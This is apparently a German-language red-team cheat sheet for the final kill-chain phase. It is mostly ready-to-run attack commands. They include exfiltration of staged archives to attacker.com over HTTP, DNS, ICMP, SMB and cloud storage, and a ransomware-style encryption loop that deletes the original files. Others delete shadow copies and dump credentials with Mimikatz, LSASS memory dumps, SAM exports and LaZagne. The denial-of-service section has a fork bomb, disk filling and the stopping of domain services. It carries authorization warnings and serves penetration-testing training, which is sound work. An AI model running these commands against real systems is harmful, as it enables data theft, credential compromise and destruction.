# 🎯 Phase 7: Umsetzung der Angriffsziele

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](07-Actions-Objectives.tr.md) • [🇬🇷 Ελληνικά](07-Actions-Objectives.el.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Ziel:** Das abschließende Ziel erreichen: Datenexfiltration, Zerstörung oder andere Auswirkungen.

---

## 📤 Datenexfiltration

### Vertrauliche Daten finden

#### Windows
```cmd
# Nach vertraulichen Dateien suchen
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Kürzlich geänderte Dateien finden
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell – Nach Inhalten suchen
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Nach vertraulichen Dateien suchen
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Kürzlich geänderte Dateien
find / -mtime -7 -type f 2>/dev/null

# Große Dateien
find / -size +100M -type f 2>/dev/null
```

### Daten komprimieren und bereitstellen

#### Windows
```powershell
# PowerShell – ZIP-Archiv erstellen
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Tar mit Komprimierung
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Komprimiertes Archiv erstellen
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# Mit Verschlüsselung
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP mit Passwort
zip -r -e data.zip /sensitive/
```

### Exfiltrationsmethoden

#### HTTP/HTTPS
```bash
# Mit curl hochladen
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 über GET (kleine Datenmengen)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# Upload mit PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### DNS-Exfiltration
```bash
# Daten in DNS-Abfragen kodieren
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Mit dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Exfiltration mit ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Mit icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Auf eine Freigabe des Angreifers kopieren
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Einhängen und kopieren (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Cloud-Dienste
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Destruktive Aktionen (Ransomware-Simulation)

> ⚠️ **WARNUNG:** Nur für autorisierte Red-Team-Einsätze!

### Verschlüsselungssimulation
```powershell
# PowerShell – Dateien verschlüsseln (Simulation)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Volumenschattenkopien löschen
```cmd
# Schattenkopien löschen (verhindert die Wiederherstellung darüber)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Schattenkopien deaktivieren
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Zugangsdaten sammeln

### Windows-Zugangsdaten
```powershell
# Mimikatz – Alle Zugangsdaten
mimikatz# sekurlsa::logonpasswords

# SAM-Datenbank auslesen
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# LSASS-Speicherabbild
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Aus dem Speicherabbild extrahieren
pypykatz lsa minidump lsass.dmp
```

### Linux-Zugangsdaten
```bash
# shadow-Datei
cat /etc/shadow

# SSH-Schlüssel
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Verlaufsdateien
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Konfigurationsdateien
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Browser-Zugangsdaten
```bash
# Chrome-Zugangsdaten (Windows)
# Speicherort: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox-Zugangsdaten (Windows)
# Speicherort: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne – Alle Browser-Passwörter
python laZagne.py all
```

---

## 🖥️ Auswirkungen auf das System

### Denial of Service (Dienstverweigerung)
```bash
# Fork-Bombe (Linux) – NICHT AUSFÜHREN!
:(){ :|:& };:

# Datenträger füllen
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# CPU auslasten
yes > /dev/null &
```

### Konten manipulieren
```bash
# Alle Benutzerpasswörter ändern
net user administrator NewP@ssw0rd!

# Konten sperren
net user username /active:no

# Benutzer löschen
net user username /delete
```

### Dienste beeinträchtigen
```cmd
# Kritische Dienste stoppen
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Dienste deaktivieren
sc config wuauserv start= disabled
```

---

## 📊 Kurzreferenz

### Exfiltrationsmethoden

| Methode | Vorteile | Nachteile |
|--------|------|------|
| HTTP/HTTPS | Üblicher Datenverkehr, verschlüsselt | Kann überwacht werden |
| DNS | Oft nicht überwacht | Langsam, Größenbeschränkungen |
| ICMP | Kann Firewalls umgehen | Sehr langsam |
| SMB | Schnell, nativ verfügbar | Nur intern |
| Cloud | Legitime Dienste | Zugangsdaten erforderlich |

### Prioritäten von Datenspeicherorten

| Speicherort | Wert |
|----------|-------|
| Domänencontroller | Höchste – AD-Zugangsdaten |
| Dateiserver | Hoch – Dokumente |
| E-Mail-Server | Hoch – Kommunikation |
| Datenbankserver | Hoch – Geschäftsdaten |
| Entwicklungsserver | Mittel – Quellcode |
| Benutzerarbeitsplätze | Mittel – Lokale Dateien |

---

## ✅ Checkliste für den Pentest-Bericht

```markdown
- [ ] Alle kompromittierten Systeme dokumentieren
- [ ] Alle gefundenen Zugangsdaten auflisten
- [ ] Angriffspfad ab dem Erstzugang abbilden
- [ ] Ausgenutzte Schwachstellen dokumentieren
- [ ] Gefundene Speicherorte vertraulicher Daten notieren
- [ ] Empfehlungen zur Behebung geben
- [ ] Zeitlichen Ablauf der Aktivitäten aufnehmen
- [ ] Zugriff durch Screenshots belegen
```

---

## 🔗 Weiterführende Cheatsheets

- [Mimikatz](../../Mimikatz/README.md)
- [Linux-Befehle](../../Linux-Commands/README.md)
- [PowerShell](../../PowerShell/README.md)

---

**Vorherige Phase:** [← 06 - Umgehung von Schutzmaßnahmen (Defense Evasion)](./06-Defense-Evasion.de.md)

**Zurück zur Übersicht:** [🎯 Kill-Chain-Übersicht](./README.de.md)

---

<p align="center">
  <b>🎯 Mission abgeschlossen!</b><br>
  <i>Diese Aktionen nur mit entsprechender Autorisierung durchführen!</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Korrekturen zur Einordnung:** Beim als „Base64 über GET“ beschrifteten Beispiel veranlasst `curl -d` tatsächlich einen HTTP-POST. Nur HTTPS verschlüsselt den HTTP-Transport; HTTP allein nicht. [curl-Handbuch](https://curl.se/docs/manpage.html) `vssadmin resize shadowstorage` ändert die Größe des Schattenkopiespeichers und deaktiviert die Funktion nicht grundsätzlich. [Microsoft: resize shadowstorage](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-resize-shadowstorage)

> **Statische Prüfung der Beispiele:** „Alle Benutzerpasswörter ändern“ zeigt nur einen Befehl für das Konto `administrator`. Die Verschlüsselungssimulation löscht die Originaldateien und ist daher destruktiv; sie ist keine risikofreie Vorschau. `ProtectedData` verwendet im Beispiel den Benutzerkontext von Windows-DPAPI, keine eigenständige portable Archivverschlüsselung. „DNS oft nicht überwacht“ und „SMB nur intern“ sind vereinfachte Annahmen, keine festen Eigenschaften der Protokolle.
